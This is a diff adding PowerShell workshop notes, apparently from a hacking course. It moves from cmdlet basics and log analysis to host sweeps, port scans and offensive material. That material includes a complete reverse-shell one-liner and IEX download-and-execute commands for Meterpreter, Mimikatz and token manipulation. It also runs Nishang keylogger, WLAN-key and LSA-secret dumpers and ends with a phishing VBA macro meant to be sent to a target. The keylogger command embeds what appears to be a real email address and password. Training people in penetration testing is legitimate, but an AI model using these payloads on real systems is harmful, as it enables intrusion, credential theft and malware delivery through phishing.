@@ -1,0 +1,1237 @@
+Powershell Class Video:
+https://s3.amazonaws.com/StrategicSec-Videos/2015-10-31+09.04+Hacking+with+Powershell+Workshop.mp4
+
+
+
+Old Powershell Video:
+https://s3.amazonaws.com/StrategicSec-Videos/_2015_6_10_rec-lw-us-4_255665_recording.mp4
+
+Video Remake:
+https://s3.amazonaws.com/StrategicSec-Videos/_2015_7_11_rec-lw-us-10_267797_recording.mp4
+
+
+#######################
+# VMs for this course #
+#######################
+https://s3.amazonaws.com/StrategicSec-VMs/Win7x64.zip
+	username: workshop
+	password: password
+	
+https://s3.amazonaws.com/StrategicSec-VMs/StrategicsecUbuntu14.zip
+	username: strategicsec
+	password: strategicsec	
+
+You can do the updates in the Win7 VM (yes, it is a lot of updates).
+
+You'll need to create directory in the Win7 VM called "c:\ps"
+
+In this file you will also need to change the text 'Strategic-Sec-Ubuntu-VM-IP' to the IP address of your Ubuntu host.
+
+
+
+#####################
+# Powershell Basics #
+#####################
+
+PowerShell is Microsoft’s new scripting language that has been built in since the release Vista. 
+
+PowerShell file extension end in .ps1 . 
+
+An important note is that you cannot double click on a PowerShell script to execute it. 
+
+To open a PowerShell command prompt either hit Windows Key + R and type in PowerShell or Start -> All Programs -> Accessories -> Windows PowerShell -> Windows PowerShell.
+
+dir 
+cd 
+ls
+cd c:\
+
+
+To obtain a list of cmdlets, use the Get-Command cmdlet
+
+Get-Command
+ 
+
+
+You can use the Get-Alias cmdlet to see a full list of aliased commands.
+
+Get-Alias
+
+
+
+Don't worry you won't blow up your machine with Powershell
+Get-Process | stop-process 				What will this command do?
+Get-Process | stop-process -whatif
+
+
+To get help with a cmdlet, use the Get-Help cmdlet along with the cmdlet you want information about.
+
+Get-Help Get-Command
+
+Get-Help Get-Service –online
+
+Get-Service -Name TermService, Spooler
+
+Get-Service –N BITS
+
+Start-Transcript 
+
+PowerShell variables begin with the $ symbol. First lets create a variable
+
+$serv = Get-Service –N Spooler
+
+To see the value of a variable you can just call it in the terminal.
+
+$serv
+
+$serv.gettype().fullname
+ 
+
+Get-Member is another extremely useful cmdlet that will enumerate the available methods and properties of an object. You can pipe the object to Get-Member or pass it in
+
+$serv | Get-Member
+
+Get-Member -InputObject $serv
+
+ 
+
+
+
+Let’s use a method and a property with our object. 
+
+$serv.Status
+$serv.Stop()
+$serv.Refresh()
+$serv.Status
+$serv.Start()
+$serv.Refresh()
+$serv.Status
+ 
+
+
+
+Methods can return properties and properties can have sub properties. You can chain them together by appending them to the first call.
+
+
+
+#############################
+# Simple Event Log Analysis #
+#############################
+
+Step 1: Dump the event logs
+---------------------------
+The first thing to do is to dump them into a format that facilitates later processing with Windows PowerShell.
+
+To dump the event log, you can use the Get-EventLog and the Exportto-Clixml cmdlets if you are working with a traditional event log such as the Security, Application, or System event logs. 
+If you need to work with one of the trace logs, use the Get-WinEvent and the ExportTo-Clixml cmdlets.
+
+Get-EventLog -LogName application | Export-Clixml Applog.xml
+
+type .\Applog.xml
+
+$logs = "system","application","security"
+
+The % symbol is an alias for the Foreach-Object cmdlet. It is often used when working interactively from the Windows PowerShell console
+
+$logs | % { get-eventlog -LogName $_ | Export-Clixml "$_.xml" }
+
+
+
+Step 2: Import the event log of interest
+----------------------------------------
+To parse the event logs, use the Import-Clixml cmdlet to read the stored XML files. 
+Store the results in a variable. 
+Let's take a look at the commandlets Where-Object, Group-Object, and Select-Object. 
+
+The following two commands first read the exported security log contents into a variable named $seclog, and then the five oldest entries are obtained.
+
+$seclog = Import-Clixml security.xml
+
+$seclog | select -Last 5
+
+
+Cool trick from one of our students named Adam. This command allows you to look at the logs for the last 24 hours:
+
+Get-EventLog Application -After (Get-Date).AddDays(-1)
+
+You can use '-after' and '-before' to filter date ranges
+
+One thing you must keep in mind is that once you export the security log to XML, it is no longer protected by anything more than the NFTS and share permissions that are assigned to the location where you store everything. 
+By default, an ordinary user does not have permission to read the security log. 
+
+
+Step 3: Drill into a specific entry
+-----------------------------------
+To view the entire contents of a specific event log entry, choose that entry, send the results to the Format-List cmdlet, and choose all of the properties. 
+
+
+$seclog | select -first 1 | fl *
+
+The message property contains the SID, account name, user domain, and privileges that are assigned for the new login. 
+
+
+($seclog | select -first 1).message
+
+(($seclog | select -first 1).message).gettype()
+
+
+
+In the *nix world you often want a count of something (wc -l). 
+How often is the SeSecurityPrivilege privilege mentioned in the message property? 
+To obtain this information, pipe the contents of the security log to a Where-Object to filter the events, and then send the results to the Measure-Object cmdlet to determine the number of events:
+
+$seclog | ? { $_.message -match 'SeSecurityPrivilege'} | measure
+
+If you want to ensure that only event log entries return that contain SeSecurityPrivilege in their text, use Group-Object to gather the matches by the EventID property. 
+
+
+$seclog | ? { $_.message -match 'SeSecurityPrivilege'} | group eventid
+
+Because importing the event log into a variable from the stored XML results in a collection of event log entries, it means that the count property is also present. 
+Use the count property to determine the total number of entries in the event log.
+
+$seclog.Count
+
+
+
+
+
+
+############################
+# Simple Log File Analysis #
+############################
+
+
+You'll need to create the directory c:\ps and download sample iss log http://pastebin.com/raw.php?i=LBn64cyA
+
+
+mkdir c:\ps
+cd c:\ps
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=LBn64cyA", "c:\ps\u_ex1104.log")
+
+
+
+
+	
+	
+	
+
+###############################################
+# Intrusion Analysis Using Windows PowerShell #
+###############################################
+
+Download sample file http://pastebin.com/raw.php?i=ysnhXxTV into the c:\ps directory
+
+
+
+
+
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=ysnhXxTV", "c:\ps\CiscoLogFileExamples.txt")
+
+Select-String 192.168.208.63 .\CiscoLogFileExamples.txt 
+
+
+
+
+The Select-String cmdlet searches for text and text patterns in input strings and files. You can use it like Grep in UNIX and Findstr in Windows.
+
+Select-String 192.168.208.63 .\CiscoLogFileExamples.txt | select line
+
+
+
+
+To see how many connections are made when analyzing a single host, the output from that can be piped to another command: Measure-Object.
+
+Select-String 192.168.208.63 .\CiscoLogFileExamples.txt | select line | Measure-Object
+
+
+
+To select all IP addresses in the file expand the matches property, select the value, get unique values and measure the output. 
+
+Select-String “\b(?:\d{1,3}\.){3}\d{1,3}\b” .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select -ExpandProperty value | Sort-Object -Unique | Measure-Object
+
+
+
+Removing Measure-Object shows all the individual IPs instead of just the count of the IP addresses. The Measure-Object command counts the IP addresses. 
+
+Select-String “\b(?:\d{1,3}\.){3}\d{1,3}\b” .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select -ExpandProperty value | Sort-Object -Unique
+
+
+In order to determine which IP addresses have the most communication the last commands are removed to determine the value of the matches. Then the group command is issued on the piped output to group all the IP addresses (value), and then sort the objects by using the alias for Sort-Object: sort count –des.
+This sorts the IP addresses in a descending pattern as well as count and deliver the output to the shell.
+
+Select-String “\b(?:\d{1,3}\.){3}\d{1,3}\b” .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select value | group value | sort count -des
+
+
+
+
+This will get the setting for logs in the windows firewall which should be enabled in GPO policy for analysis. 
+The command shows that the Firewall log is at:
+%systemroot%\system32\LogFiles\Firewall\pfirewall.log, in order to open the file PowerShell will need to be run with administrative privileges.
+
+
+First step is to get the above command into a variable using script logic.
+Thankfully PowerShell has a built-in integrated scripting environment, PowerShell.ise. 
+
+netsh advfirewall show allprofiles | Select-String FileName | select -ExpandProperty line | Select-String “%systemroot%.+\.log" | select -ExpandProperty matches | select -ExpandProperty value | sort –uniq
+
+
+##############################################
+# Parsing Log files using windows PowerShell #
+##############################################
+
+Download the sample IIS log http://pastebin.com/LBn64cyA 
+
+
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=LBn64cyA", "c:\ps\u_ex1104.log")
+
+Get-Content ".\*log" | ? { ($_ | Select-String "WebDAV")}  
+
+
+
+The above command would give us all the WebDAV requests.
+
+To filter this to a particular user name, use the below command:
+
+Get-Content ".\*log" | ? { ($_ | Select-String "WebDAV") -and ($_ | Select-String "OPTIONS")}  
+
+ 
+
+Some more options that will be more commonly required : 
+
+For Outlook Web Access : Replace WebDAV with OWA 
+
+For EAS : Replace WebDAV with Microsoft-server-activesync 
+
+For ECP : Replace WebDAV with ECP
+
+ 
+
+To find out the count of the EWS request we can go ahead and run the below command
+
+(Get-Content ".\*log" | ? { ($_ | Select-String "WebDAV") -and ($_ | Select-String "Useralias")}).count
+
+
+
+
+
+####################################################################
+# Windows PowerShell: Extracting Strings Using Regular Expressions #
+####################################################################
+To build a script that will extract data from a text file and place the extracted text into another file, we need three main elements:
+
+1) The input file that will be parsed
+
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=rDN3CMLc", "c:\ps\emails.txt")
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=XySD8Mi2", "c:\ps\ip_addresses.txt")
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=v5Yq66sH", "c:\ps\URL_addresses.txt")
+
+2) The regular expression that the input file will be compared against
+
+3) The output file for where the extracted data will be placed.
+
+Windows PowerShell has a “select-string” cmdlet which can be used to quickly scan a file to see if a certain string value exists. 
+Using some of the parameters of this cmdlet, we are able to search through a file to see whether any strings match a certain pattern, and then output the results to a separate file.
+
+To demonstrate this concept, below is a Windows PowerShell script I created to search through a text file for strings that match the Regular Expression (or RegEx for short) pattern belonging to e-mail addresses.
+
+$input_path = ‘c:\ps\emails.txt’
+$output_file = ‘c:\ps\extracted_addresses.txt’
+$regex = ‘\b[A-Za-z0-9._%-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}\b’
+select-string -Path $input_path -Pattern $regex -AllMatches | % { $_.Matches } | % { $_.Value } > $output_file
+
+In this script, we have the following variables:
+
+1) $input_path to hold the path to the input file we want to parse
+
+2) $output_file to hold the path to the file we want the results to be stored in
+
+3) $regex to hold the regular expression pattern to be used when the strings are being matched.
+
+The select-string cmdlet contains various parameters as follows:
+
+1) “-Path” which takes as input the full path to the input file
+
+2) “-Pattern” which takes as input the regular expression used in the matching process
+
+3) “-AllMatches” which searches for more than one match (without this parameter it would stop after the first match is found) and is piped to “$.Matches” and then “$_.Value” which represent using the current values of all the matches.
+
+Using “>” the results are written to the destination specified in the $output_file variable.
+
+Here are two further examples of this script which incorporate a regular expression for extracting IP addresses and URLs.
+
+IP addresses
+------------
+For the purposes of this example, I ran the tracert command to trace the route from my host to google.com and saved the results into a file called ip_addresses.txt. You may choose to use this script for extracting IP addresses from router logs, firewall logs, debug logs, etc.
+
+$input_path = ‘c:\ps\ip_addresses.txt’
+$output_file = ‘c:\ps\extracted_ip_addresses.txt’
+$regex = ‘\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b’
+select-string -Path $input_path -Pattern $regex -AllMatches | % { $_.Matches } | % { $_.Value } > $output_file
+
+
+URLs
+----
+For the purposes of this example, I created a couple of dummy web server log entries and saved them into URL_addresses.txt. 
+You may choose to use this script for extracting URL addresses from proxy logs, network packet capture logs, debug logs, etc.
+
+$input_path = ‘c:\ps\URL_addresses.txt’
+$output_file = ‘c:\ps\extracted_URL_addresses.txt’
+$regex = ‘([a-zA-Z]{3,})://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?’
+select-string -Path $input_path -Pattern $regex -AllMatches | % { $_.Matches } | % { $_.Value } > $output_file
+
+
+In addition to the examples above, many other types of strings can be extracted using this script. 
+All you need to do is switch the regular expression in the “$regex” variable! 
+In fact, the beauty of such a PowerShell script is its simplicity and speed of execution.
+
+
+
+#################################
+# Packet Sniffer For Powershell #
+#################################
+
+Reference:
+http://poshcode.org/764
+http://blog.robbiefoust.com/?p=68
+http://blog.robbiefoust.com/?p=9
+
+I was looking for a Powershell script that would capture raw IP packets on the network and shove them into an object, but the only one I was able to find was a commercial cmdlet that was out of my budget. So, I decided that I would attempt to write my own. I figured it would be a great learning exercise (and it was), but I went into the project with the goal of avoiding any 3rd party software, to avoid compiling anything (like a cmdlet written in C#), and I didn’t want to install a driver shim. In other words, I wanted a plain ‘ol script that could be run on any computer.
+
+I basically spent a lot of time googling and I got a lot of help from the guys over in the #Powershell IRC channel (irc.freenode.net). All of that combined with trial-and-error, I give you…. *drumroll* get-packet.ps1.
+
+The script recognizes IPv4 TCP, UDP, ICMP, and IGMP packets (for now). The thing that took me the longest amount of time trying to figure out was how to get all packets that the network card was seeing on the wire, not just packets destined for my IP address and a particular port number. The solution was hard to find but wasn’t terribly difficult to understand.
+
+# Create a new socket... SocketType should be Raw, and ProtocolType must be IP for promiscuous mode.
+$socket = new-object system.net.sockets.socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::IP)
+
+# Include the IP header so we get the full packet
+$socket.setsocketoption("IP","HeaderIncluded",$true)
+
+# bind to a local IP address$ipendpoint = new-object system.net.ipendpoint([net.ipaddress]"$localIP",0)$socket.bind($ipendpoint)
+
+# this switches the NIC driver into promiscuous mode.  This requires admin rights.
+[void]$socket.iocontrol([net.sockets.iocontrolcode]::ReceiveAll,$byteIn,$byteOut)
+I read somewhere that .net sockets really just uses winsock under the hood, so it really helped my understanding to read both the winsock and dotnet documentation regarding sockets on msdn. I won’t bother repeating what that documentation says here but if you’re trying to decypher this script and can’t quite figure it out, feel free to ask questions and I’ll try to explain.
+
+Something else that I probably knew at one point but had since forgotten was that the byte order on the network wire is reversed. On the wire it is “Big Endian” and on the PC it is “Little Endian.” Wikipedia has a great explanation on Endianness. Figuring out how to interpret the IP packets was the next biggest time suck and endianness was a large part of it. Once I realized that NetworkToHostOrder didn’t support unsigned ints, I simply wrote a few functions to reverse the byte order (from “Network” to “Host”) and used BitConverter to return the correct data type.
+
+# Takes a 2 byte array, switches it from big endian to little endian, and converts it to uint16.
+function NetworkToHostUInt16 ($value) { [Array]::Reverse($value) [BitConverter]::ToUInt16($value,0) }
+
+# Takes a 4 byte array, switches it from big endian to little endian, and converts it to uint32.
+function NetworkToHostUInt32 ($value) { [Array]::Reverse($value) [BitConverter]::ToUInt32($value,0) }
+
+# Takes a byte array, switches it from big endian to little endian, and converts it to a string.
+function ByteToString ($value) { $AsciiEncoding = new-object system.text.asciiencoding $AsciiEncoding.GetString($value) }
+After getting all the data out of the packets, I shove the ones I really want into a psobject. When running the script, it will be visually more appealing if you pipe the output to format-table.
+
+PS C:\> ./get-packet.ps1 | ft
+There are a lot more protocol types that I could be looking for, and I’ll probably add some of the more common ones eventually. I’ve also looked into adding support to export and import the libpcap file format, but after looking at the libpcap source code, there’s a lot of ugly in there that I might just avoid for now.
+
+quick way to done this is
+
+(new-object System.Net.WebClient).DownloadFile("http://poshcode.org/get/764", "c:\ps\get-packet.ps1")
+PS C:\> ./get-packet.ps1 | ft
+
+try to open some web page
+
+
+###################
+# Pentester Tasks #
+###################
+Reference:
+http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/02/use-powershell-for-network-host-and-port-discovery-sweeps.aspx
+
+
+Listing IPs
+One of the typical ways for working with IP addressed in most scripts is to work with an octet and then increase the last one
+
+$octect = "192.168.6."
+$lastoctect = (1..255)
+$lastoctect | ForEach-Object {write-host "$($octect)$($_)"}
+
+Ping Sweep
+PowerShell provides several methods for doing Ping
+Test-Connection cmdlet
+Creation of a WMI Object
+.Net System.Net.NetworkInformation.Ping Object
+
+function New-IPRange ($start, $end) {
+$ip1 = ([System.Net.IPAddress]$start).GetAddressBytes()
+[Array]::Reverse($ip1)
+$ip1 = ([System.Net.IPAddress]($ip1 -join '.')).Address
+
+$ip2 = ([System.Net.IPAddress]$end).GetAddressBytes()
+[Array]::Reverse($ip2)
+$ip2 = ([System.Net.IPAddress]($ip2 -join '.')).Address
+
+for ($x=$ip1; $x -le $ip2; $x++) {
+$ip = ([System.Net.IPAddress]$x).GetAddressBytes()
+[Array]::Reverse($ip)
+$ip -join '.'
+}
+}
+$ping = New-Object System.Net.NetworkInformation.Ping
+New-IPRange 192.168.6.1 192.168.6.150 | ForEach-Object {$ping.Send($_, 100)} | where {$_.status -eq "Success"}
+
+Reverse Lookups
+For reverse lookups using .Net Class we use the [System.Net.Dns]::GetHostEntry(IP) method Returns System.Net.IPHostEntry
+
+[System.Net.Dns]::GetHostByAddress("204.244.123.113")
+
+
+Forward Lookups
+
+[System.Net.Dns]::GetHostAddresses("www.google.com")
+
+Port Scans
+To test if a port is open on a remote host in PowerShell the best method is to use the .Net abstraction that it provides to Windows Socket library
+For TCP the .Net System.Net.Sockets.TcpClient
+For UDP the .Net System.Net.Sockets.UdpClient
+TCP Scan
+
+$ports=22,80
+$target = "Strategic-Sec-Ubuntu-VM-IP"
+foreach ($i in $ports) {
+try {
+$socket = new-object System.Net.Sockets.TCPClient($target, $i);
+} catch {}
+if ($socket -eq $NULL) {
+echo "$target:$i - Closed";
+} else {
+echo "$target:$i - Open";
+$socket = $NULL;
+}}
+
+
+PARSING NMAP RESULT
+Run Powershell as administrator
+
+cd C:\
+
+Get-ExecutionPolicy
+Set-ExecutionPolicy Unrestricted –Force
+
+
+
+Parse nmap XML
+.\parse-nmap.ps1 samplescan.xml
+
+Process all XML files
+
+.\parse-nmap.ps1 *.xml
+
+Piping also works
+dir *.xml | .\parse-nmap.ps1
+
+Advanced parsing with filtering conditions
+.\parse-nmap.ps1 samplescan.xml | where {$_.OS -like "*Windows XP*"} | format-table IPv4,HostName,OS
+
+More parsing
+.\parse-nmap.ps1 samplescan.xml | where {$_.Ports -like "*open:tcp:22*"}
+
+Parsing with match and multiple conditions
+.\parse-nmap.ps1 samplescan.xml |where {$_.Ports -match "open:tcp:80|open:tcp:443"}
+
+CSV Export
+.\parse-nmap.ps1 samplescan.xml -outputdelimiter " " | where {$_.Ports -match "open:tcp:80"} | export-csv weblisteners.csv
+
+Import Data from CSV
+$data = import-csv weblisteners.csv
+$data | where {($_.IPv4 -like "10.57.*") -and ($_.Ports -match "open:tcp:22")}
+
+Export to HTML
+.\parse-nmap.ps1 samplescan.xml -outputdelimiter " " |select-object IPv4,HostName,OS | ConvertTo-Html | out-file report.html
+
+
+
+
+Nessus with PowerShell
+
+Let’s take a look at the Import-Csv cmdlet and what are the members of the object it returns:
+
+Import-Csv C:\class_nessus.csv | Get-Member
+
+filter the objects:
+
+Import-Csv C:\class_nessus.csv | where {$_.risk -eq "high"}
+
+use the Select-Object cmdlet and only get unique entries:
+
+Import-Csv C:\class_nessus.csv | where {$_.risk -eq "high"} | select host -Unique
+
+Import-Csv C:\class_nessus.csv | where {"high","medium","low" -contains $_.risk} | select "Plugin ID", CVE, CVSS, Risk, Host, Protocol, Port, Name | Out-GridView
+
+ 
+ConvertTo-Html cmdlet and turn it in to an HTML report in list format:
+
+Import-Csv C:\class_nessus.csv | where {"high","medium","low" -contains $_.risk} | select "Plugin ID", CVE, CVSS, Risk, Host, Protocol, Port, Name | ConvertTo-Html -As List > C:\report2.html
+
+
+
+
+
+****************************
+Reverseshell with PowerShell
+****************************
+nc -lvp 1234			(command prompt 1)
+
+
+				(command prompt 2)
+powershell -command "function ReverseShellClean {if ($client.Connected -eq $true) {$client.Close()};  if ($process.ExitCode -ne $null) {$process.Close()};  exit;  };$address = '127.0.0.1';  $port = '1234';$client = New-Object system.net.sockets.tcpclient; $client.connect($address,$port) ;$stream = $client.GetStream();$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize  ;$process = New-Object System.Diagnostics.Process  ;$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'  ;$process.StartInfo.RedirectStandardInput = 1  ;$process.StartInfo.RedirectStandardOutput = 1;$process.StartInfo.UseShellExecute = 0  ;$process.Start()  ;$inputstream = $process.StandardInput  ;$outputstream = $process.StandardOutput  ;Start-Sleep 1  ;$encoding = new-object System.Text.AsciiEncoding  ;while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())};$stream.Write($encoding.GetBytes($out),0,$out.Length)  ;$out = $null; $done = $false; $testing = 0; ;while (-not $done) {if ($client.Connected -ne $true) {cleanup}  ;$pos = 0; $i = 1;  while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) { $read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos);  $pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}  ;if ($pos -gt 0){ $string = $encoding.GetString($networkbuffer,0,$pos);  $inputstream.write($string);  start-sleep 1;  if ($process.ExitCode -ne $null) {ReverseShellClean};else {  $out = $encoding.GetString($outputstream.Read()); while($outputstream.Peek() -ne -1){;  $out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}};  $stream.Write($encoding.GetBytes($out),0,$out.length);  $out = $null;  $string = $null}} else {ReverseShellClean}};"
+
+
+####################################################
+# Running Powershell From A Command Prompt         #
+# Using Powersploit & Nishang			           #
+####################################################
+
+COMMAND & 1 PARAMATER SYNTAX:		
+	powershell -command "& {&'some-command' someParam}"
+
+
+
+MULTIPLE COMMAND & PARAMETER SYNTAX
+	powershell -command "& {&'some-command' someParam}"; "& {&'some-command' -SpecificArg someParam}"
+
+
+
+Tools to download to the web root (/var/www) of your StrategicSec-Ubuntu-VM:
+https://github.com/mattifestation/PowerSploit.git
+https://github.com/samratashok/nishang
+
+from the strategicsec home dir copy nc.exe to /var/www/ folder
+
+user:strategicsec
+pass:strategicsec
+
+sudo cp nc.exe. /var/www
+
+cd /var/www
+sudo git clone https://github.com/samratashok/nishang
+sudo git clone https://github.com/mattifestation/PowerSploit
+
+
+********************************** Simple Ping Sweep **********************************
+powershell -command "50..100 | % {\""192.168.6.$($_): $(Test-Connection -count 1 -comp 192.168.6.$($_) -quiet)\""}"
+
+
+
+
+
+********************************** Simple Port 445 Sweep **********************************
+powershell -command "1..255 | % { echo ((new-object Net.Sockets.TcpClient).Connect(\""192.168.6.$_\"",445)) \""192.168.6.$_\""} 2>$null"
+
+
+
+
+
+
+********************************** Simple Port Scan **********************************
+powershell -command "1..1024 | % { echo ((new-object Net.Sockets.TcpClient).Connect(\""192.168.6.XX\"",$_)) \""$_ is open\""} 2>$null"
+
+
+
+
+
+
+********************************** Download a file **********************************
+powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://Strategic-Sec-Ubuntu-VM-IP/nc.exe', 'nc.exe’)"
+
+
+
+
+
+********************************** Downloading files: Binaries **********************************
+powershell -command "(New-ObjectSystem.Net.WebClient).DownloadFile("http://Strategic-Sec-Ubuntu-VM-IP/nc.exe","c:\nc.exe“)" 
+
+
+
+
+
+********************************** Text file stdout to local file  **********************************
+(New-Object System.Net.WebClient).DownloadString("http://Strategic-Sec-Ubuntu-VM-IP/PowerSploit/CodeExecution/Invoke-Shellcode.ps1") | Out-File -Encoding ASCII Invoke-Shellcode.ps1 
+
+
+
+
+********************************** Powershell Download & Execute Reverse Meterpreter **********************************
+from ubuntu host browse to metasploit folder 
+cd ~/toolz/metasploit/
+
+sudo ./msfconsole
+use exploit/multi/handler
+set ExitOnSession false
+set payload windows/meterpreter/reverse_https
+set LHOST Strategic-Sec-Ubuntu-VM-IP
+set LPORT 443
+set EXITFUNC thread
+exploit -j
+
+
+
+powershell -command "IEX (New-Object Net.WebClient).DownloadString('https://s3.amazonaws.com/StrategicSec-Files/Powersploit/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost Strategic-Sec-Ubuntu-VM-IP -Lport 443 -Force"
+
+
+
+
+
+********************************** Payload which could execute shellcode from DNS TXT queries. **********************************
+powershell.exe (new-object System.Net.WebClient).DownloadFile('http://Strategic-Sec-Ubuntu-VM-IP/nishang/Execution/Execute-DNSTXT-Code.ps1','%TEMP%\Execute-DNSTXT-Code.ps1')
+powershell.exe -ExecutionPolicy Bypass -command %TEMP%\Execute-DNSTXT-Code.ps1 32.alteredsecurity.com 64.alteredsecurity.com ns8.zoneedit.com
+
+
+
+
+
+
+powershell -command "IEX (New-Object Net.WebClient).DownloadString('http://Strategic-Sec-Ubuntu-VM-IP/powersploit/Exfiltration/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz" 
+
+
+
+
+
+
+
+
+
+********************************** Run mimikatz via powershell  (must be run as SYSTEM) **********************************
+powershell -command "IEX (New-Object Net.WebClient).DownloadString('https://s3.amazonaws.com/StrategicSec-Files/Powersploit/Invoke-Mimikatz.ps1') | Out-File -Encoding ASCII Invoke-Mimikatz.ps1; Import-Module .\Invoke-Mimikatz.ps1 ; Invoke-Mimikatz"
+
+
+
+
+
+********************************** Token Manipulation to escalate (must be run as an Administrator) **********************************
+powershell -command "IEX (New-Object Net.WebClient).DownloadString('http://Strategic-Sec-Ubuntu-VM-IP/powersploit/Exfiltration/Invoke-TokenManipulation.ps1') ; Invoke-TokenManipulation" 
+
+powershell -command "IEX (New-Object Net.WebClient).DownloadString('https://s3.amazonaws.com/StrategicSec-Files/Powersploit/Invoke-TokenManipulation.ps1') | Out-File -Encoding ASCII Invoke-TokenManipulation.ps1; Import-Module .\Invoke-TokenManipulation.ps1 ; Invoke-TokenManipulation"
+
+
+
+
+
+
+
+
+********************************** Nihsang payload which Scan IP-Addresses, Ports and HostNames **********************************
+powershell.exe (new-object System.Net.WebClient).DownloadFile('http://Strategic-Sec-Ubuntu-VM-IP/nishang/Invoke-PingSweep.ps1','%TEMP%\Invoke-PingSweep.ps1')
+powershell.exe -ExecutionPolicy Bypass -command %TEMP%\Invoke-PingSweep.ps1 -StartAddress 192.168.6.50 -EndAddress 192.168.6.100 -ResolveHost -ScanPort
+
+
+
+
+
+
+********************************** Nihsang payload which Scan IP-Addresses, Ports and HostNames **********************************
+powershell.exe (new-object System.Net.WebClient).DownloadFile('http://Strategic-Sec-Ubuntu-VM-IP/nishang/Port-Scan.ps1','%TEMP%\Port-Scan.ps1')
+powershell.exe -ExecutionPolicy Bypass -command %TEMP%\Port-Scan.ps1 -StartAddress 192.168.6.50 -EndAddress 192.168.6.100 -ResolveHost -ScanPort
+
+
+
+
+
+********************************** Nishang Payload which gathers juicy information from the target. **********************************
+powershell.exe (new-object System.Net.WebClient).DownloadFile('http://Strategic-Sec-Ubuntu-VM-IP/nishang/Get-Information.ps1','%TEMP%\Get-Information.ps1')
+powershell.exe -ExecutionPolicy Bypass -command %TEMP%\Get-Information.ps1
+
+
+
+
+
+********************************** Nishang Payload which gathers juicy information from the target. **********************************
+powershell.exe (new-object System.Net.WebClient).DownloadFile('http://Strategic-Sec-Ubuntu-VM-IP/nishang/Information_Gather.ps1','%TEMP%\Information_Gather.ps1')
+powershell.exe -ExecutionPolicy Bypass -command %TEMP%\Information_Gather.ps1
+
+
+
+
+
+********************************** Nishang script which can drop and execute executables on multiple computers. **********************************
+powershell.exe (new-object System.Net.WebClient).DownloadFile('http://Strategic-Sec-Ubuntu-VM-IP/nishang/Run-EXEonRemote.ps1','%TEMP%\Run-EXEonRemote.ps1')
+powershell.exe -ExecutionPolicy Bypass -command Invoke-Command -FilePath %TEMP%\Run-EXEonRemote.ps1 -ComputerName Test-PC
+
+
+
+
+
+********************************** Nishang Payload which logs keys. **********************************
+powershell.exe (new-object System.Net.WebClient).DownloadFile('http://Strategic-Sec-Ubuntu-VM-IP/nishang/Keylogger.ps1','%TEMP%\Keylogger.ps1')
+powershell.exe -ExecutionPolicy Bypass -command %TEMP%\Keylogger.ps1 16e7a8a83f04eec8ab6bc1bce9d103e3 juraghh@gmail.com ITp!Ka3099 1 http://example.com stopthis
+
+
+
+
+
+********************************** Nishang Payload which silently browses to a URL and accepts Java Applet Run Warning **********************************
+powershell.exe (new-object System.Net.WebClient).DownloadFile('http://Strategic-Sec-Ubuntu-VM-IP/nishang/Browse_Accept_Applet.ps1','%TEMP%\Browse_Accept_Applet.ps1')
+powershell.exe -ExecutionPolicy Bypass -command %TEMP%\Browse_Accept_Applet.ps1 http://Strategic-Sec-Ubuntu-VM-IP:8080/JavaExploit
+ 
+
+
+
+********************************** Nishang Payload which dumps keys for WLAN profiles. **********************************
+powershell.exe (new-object System.Net.WebClient).DownloadFile('http://Strategic-Sec-Ubuntu-VM-IP/nishang/Get-WLAN-Keys.ps1','%TEMP%\Get-WLAN-Keys.ps1')
+powershell.exe -ExecutionPolicy Bypass -command %TEMP%\Get-WLAN-Keys.ps1
+
+
+
+
+
+********************************** Nishang payload which extracts LSA Secrets from local computer. **********************************
+powershell.exe (new-object System.Net.WebClient).DownloadFile('http://Strategic-Sec-Ubuntu-VM-IP/nishang/Get-LSASecret.ps1','%TEMP%\Get-LSASecret.ps1')
+powershell.exe -ExecutionPolicy Bypass -command %TEMP%\Get-LSASecret.ps1 -filename .\servers.txt
+
+
+
+
+
+
+
+
+
+
+
+##########################
+#Phishing with PowerShell#
+##########################
+
+Reference:
+http://securitypadawan.blogspot.com/2014/01/phishing-with-powershell.html
+http://www.rapid7.com/db/modules/exploit/windows/misc/psh_web_delivery
+
+I have seen quite a few tweets/comments/etc about using Powershell's functionality within the context of a Microsoft Office document/VBA (https://github.com/enigma0x3/Powershell-Payload-Excel-Delivery/blob/master/MacroCode). I am going to share a way I have been leveraging Powershell for payload delivery during phishing engagements for a while now to achieve the same end result in a much simpler fashion. The two stages are as follows:
+
+Attacker Machine:
+msf > use exploit/windows/misc/psh_web_delivery
+msf exploit(psh_web_delivery) > set SRVHOST Strategic-Sec-Ubuntu-VM-IP
+msf exploit(psh_web_delivery) > set URIPATH boom
+msf exploit(psh_web_delivery) > exploit
+
+VBA Macro:
+Sub AutoOpen()
+
+    Call Shell("powershell.exe -w hidden -nop -ep bypass -c ""IEX ((new-object net.webclient).downloadstring('http://Strategic-Sec-Ubuntu-VM-IP:8080/boom'))""", 1)
+End Sub
+
+Save the document as a macro-enabled file.
+Send to target, and upon opening....
+
+
+
+
+
+
